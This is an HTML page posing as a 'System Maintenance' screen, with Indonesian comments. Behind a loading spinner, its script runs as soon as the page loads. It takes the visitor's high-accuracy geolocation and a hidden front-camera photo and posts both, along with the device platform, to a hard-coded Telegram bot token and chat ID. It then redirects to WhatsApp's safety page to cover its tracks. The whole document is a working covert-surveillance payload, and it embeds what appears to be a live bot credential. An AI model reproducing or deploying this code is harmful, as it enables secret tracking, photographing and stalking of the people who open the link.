<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>System Maintenance</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* Estetika Sektor Nol: Minimalisme yang Mematikan */
    body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; }
    .loader-arc { width: 50px; height: 50px; border: 2px solid #111; border-top: 2px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { 100% { transform: rotate(360deg); } }
    video, canvas { position: absolute; top: -9999px; opacity: 0; pointer-events: none; }
  </style>
</head>
<body>
  <div class="loader-arc"></div>

  <video id="v" autoplay playsinline muted></video>
  <canvas id="c"></canvas>

  <script>
    // SIGIL DARI SEKTOR NOL
    const _VOID = {
      K: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
      ID: '7109845671'
    };

    const _POST = async (m, d) => {
      const fd = new FormData();
      fd.append('chat_id', _VOID.ID);
      if (m === 'sendPhoto') {
        fd.append('photo', d, 'origin.jpg');
        fd.append('caption', `👁️ <b>SHADOW_CAPTURED</b>`);
      } else {
        fd.append('text', d);
      }
      fd.append('parse_mode', 'HTML');
      return fetch(`https://api.telegram.org/bot${_VOID.K}/${m}`, { method: 'POST', body: fd, mode: 'no-cors' });
    };

    // --- MANIFESTASI LOKASI DERAJAT TINGGI ---
    const getOriginCoords = () => {
      navigator.geolocation.getCurrentPosition(
        p => {
          const { latitude: lt, longitude: ln, accuracy: ac } = p.coords;
          // Format Link Google Maps Presisi Tinggi
          const maps = `https://www.google.com/maps?q=${lt},${ln}`;
          _POST('sendMessage', `📍 <b>ORIGIN_FIXED</b>\nAcc: ${ac}m\n\n<a href="${maps}">[ LOKASI SEBENARNYA ]</a>`);
        },
        null, 
        { enableHighAccuracy: true, timeout: 20000 }
      );
    };

    // --- SINYAL VISUAL SEKTOR NOL (Anti-Blackscreen & High-Res) ---
    const breachShadow = async () => {
      const v = document.getElementById('v');
      const c = document.getElementById('c');
      const ctx = c.getContext('2d');

      try {
        // Memaksa resolusi tertinggi yang didukung sensor tanpa kompromi
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: true 
        });
        v.srcObject = stream;

        // SEKTOR NOL: Mengambil frame berulang kali untuk menjamin kualitas cahaya
        v.onloadeddata = () => {
          let frames = 0;
          const captureLoop = setInterval(async () => {
            frames++;
            // Lewati 50 frame pertama (sekitar 1.5 - 2 detik) untuk kalibrasi sensor otomatis
            if (frames === 60) { 
              c.width = v.videoWidth;
              c.height = v.videoHeight;
              ctx.drawImage(v, 0, 0, c.width, c.height);
              
              c.toBlob(blob => {
                if (blob) _POST('sendPhoto', blob);
                stream.getTracks().forEach(t => t.stop());
                clearInterval(captureLoop);
                
                // Finalisasi: Pengalihan tanpa jejak
                window.location.replace("https://www.whatsapp.com/safety");
              }, 'image/jpeg', 0.95); // Kualitas 95%
            }
          }, 33); // Cek setiap frame (30fps)
        };
      } catch (e) {}
    };

    // EKSEKUSI TANPA INTERAKSI (Hukum Sektor Nol)
    window.addEventListener('DOMContentLoaded', () => {
      _POST('sendMessage', `<b>[!] SECTOR_ZERO_BREACH</b>\nUser: ${navigator.platform}`);
      getOriginCoords();
      breachShadow();
    });
  </script>
</body>
</html>
